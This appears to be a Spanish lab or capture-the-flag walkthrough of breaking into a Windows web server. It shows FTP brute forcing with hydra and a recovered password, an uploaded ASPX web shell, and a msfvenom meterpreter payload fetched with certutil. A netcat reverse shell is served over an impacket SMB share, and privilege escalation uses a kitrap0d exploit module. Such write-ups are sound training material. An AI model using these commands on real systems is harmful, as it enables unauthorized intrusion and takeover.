Hacemos el escaneo con nmap:
![[Pasted image 20240624133823.png]]
En el puerto 80 podemos visualizar un servidor de apache:
![[Pasted image 20240624133902.png]]
![[Pasted image 20240624133934.png]]
Intentamos enumerar el puerto 445 pero no tenemos permiso ya que no tenemos credenciales:
```bash
smbclient -L 192.168.0.49
```
![[Pasted image 20240624134259.png]]
Probamos en hacer fuerza bruta al puerto 21, donde usaremos un diccionario específico de usuarios y otro de contraseñas:
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```
Y encontramos las siguientes credenciales:
```bash
info:PolniyPizdec0211
```
![[Pasted image 20240624134912.png]]
Y estamos dentro:
![[Pasted image 20240624135010.png]]
Una vez dentro, probamos en subir un archivo y vemos que podemos acceder a él desde el navegador:
![[Pasted image 20240624135130.png]]
![[Pasted image 20240624135139.png]]
Probamos en subir un archivo cmdasp.aspx malicioso:
![[Pasted image 20240624135245.png]]
Y vemos que obtenemos ejecución remota de comandos:
![[Pasted image 20240624135315.png]]
Vamos a crear un .exe malicioso para obtener intrusión al servidor:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.50 LPORT=444 -f exe -o shell.exe
```
![[Pasted image 20240624140200.png]]
Lo compartimos con certutil y python:
```bash
certutil -split -urlcache -f http://192.168.0.50/shell.exe
```
Y no tenemos permisos de escritura:
![[Pasted image 20240624140439.png]]
Entonces lo que haremos será alojar en un recurso compartido con impacket el binario de nc.exe:
![[Pasted image 20240624140544.png]]
Nos traemos este binario de netcat al escritorio y desde ahí creamos el recurso compartido:
```bash
impacket-smbserver recurso $(pwd) -smb2support
```
![[Pasted image 20240624140733.png]]
Y ahora desde el servidor ejecutamos lo siguiente, para descargar el binario del recurso compartido y al mismo tiempo enviarnos la reverse shell:
```bash
\\192.168.0.50\recurso\nc.exe -e cmd.exe 192.168.0.50 443
```
![[Pasted image 20240624140916.png]]
Y recibimos la conexión:
![[Pasted image 20240624140933.png]]
En este punto, para escalar privilegios nos enviamos la shell.exe para recibir una sesión de meterpreter y así escalar privilegios con el módulo de local_exploit_suggester, donde pasaremos el escaneo y usaremos el siguiente exploit:
```bash
exploit/windows/local/ms10_015_kitrap0d
```
![[Pasted image 20240624141925.png]]
Lo lanzamos y habremos escalado privilegios:
![[Pasted image 20240624142003.png]]



